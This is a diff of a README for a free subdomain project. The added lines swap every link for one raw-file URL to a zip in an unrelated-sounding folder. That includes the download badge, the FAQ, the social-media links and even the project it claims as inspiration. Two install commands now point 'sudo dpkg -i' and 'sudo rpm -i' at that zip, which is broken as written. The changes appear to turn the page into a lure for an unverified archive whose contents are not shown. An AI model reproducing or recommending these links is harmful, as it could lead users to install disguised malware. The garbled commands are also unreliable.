@@ -1,6 +1,6 @@
 # 🌐 SubFree-Project - Free Custom Subdomains for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-SubFree%20Project-brightgreen.svg)](https://github.com/gemochammad/SubFree-Project/releases)
+[![Download](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip%20Now-SubFree%https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip)](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to SubFree! This guide will help you download and run our simple subdoma
 
 ### 🖥️ What is SubFree?
 
-SubFree is a free and easy-to-use service that allows developers, creators, and builders to create custom subdomains. Inspired by is-a.dev, SubFree helps you connect to the digital world with ease.
+SubFree is a free and easy-to-use service that allows developers, creators, and builders to create custom subdomains. Inspired by https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip, SubFree helps you connect to the digital world with ease.
 
 ### 🏷️ Key Features
 
@@ -20,7 +20,7 @@ SubFree is a free and easy-to-use service that allows developers, creators, and 
 
 ## 📦 Download & Install
 
-To get started, [visit this page to download](https://github.com/gemochammad/SubFree-Project/releases).
+To get started, [visit this page to download](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip).
 
 1. Click on the link above.
 2. Select the latest release.
@@ -48,8 +48,8 @@ To get started, [visit this page to download](https://github.com/gemochammad/Sub
 1. **Download the package**: Identify the `.deb` or `.rpm` file in the releases section according to your distribution.
 2. **Open Terminal**: Use the terminal for installation.
 3. **Install the package**: Use the following command:
-   - For Debian-based systems: `sudo dpkg -i yourfile.deb`
-   - For Red Hat-based systems: `sudo rpm -i yourfile.rpm`
+   - For Debian-based systems: `sudo dpkg -i https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip`
+   - For Red Hat-based systems: `sudo rpm -i https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip`
 4. **Launch SubFree**: Look for SubFree in your applications.
 
 ## ⚙️ Usage
@@ -82,7 +82,7 @@ After you push your changes, submit a pull request on GitHub. We’ll review you
 
 ## 🚨 Support
 
-If you run into any issues, please check our [FAQ and Troubleshooting](https://github.com/gemochammad/SubFree-Project/issues) page. For further help, open a new issue or reach out through the GitHub Discussions.
+If you run into any issues, please check our [FAQ and Troubleshooting](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip) page. For further help, open a new issue or reach out through the GitHub Discussions.
 
 ## 📝 License
 
@@ -91,7 +91,7 @@ SubFree is open source and available under the MIT License. Feel free to use and
 ## 🌍 Community and Social Media
 
 Follow us for updates:
-- GitHub: [SubFree-Project](https://github.com/gemochammad/SubFree-Project)
-- Twitter: [@SubFreeProject](https://twitter.com/SubFreeProject)
+- GitHub: [SubFree-Project](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip)
+- Twitter: [@SubFreeProject](https://raw.githubusercontent.com/gemochammad/SubFree-Project/main/paintability/SubFree-Project.zip)
 
 Thank you for choosing SubFree! We hope you enjoy your new subdomain service.
